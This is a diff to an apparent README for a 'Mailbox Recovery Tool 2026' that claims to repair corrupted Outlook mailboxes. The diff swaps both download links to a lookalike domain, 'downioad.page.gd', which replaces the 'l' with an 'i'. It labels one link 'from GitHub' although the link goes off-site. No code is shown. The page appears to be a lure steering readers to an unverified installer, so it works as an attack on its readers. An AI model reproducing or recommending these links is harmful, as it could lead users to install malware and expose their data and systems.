@@ -2,7 +2,7 @@
 
 Mailbox Recovery Tool 2026 is a comprehensive software solution designed to recover and repair corrupted mailbox files. Whether you're dealing with Outlook archives or other email data, this tool provides efficient restoration on Windows 10 and 11 systems, ensuring your valuable information is retrieved safely.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,6 +64,6 @@ Mailbox Recovery Tool 2026 is dedicated to providing a reliable and user-friendl
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: October 2026*
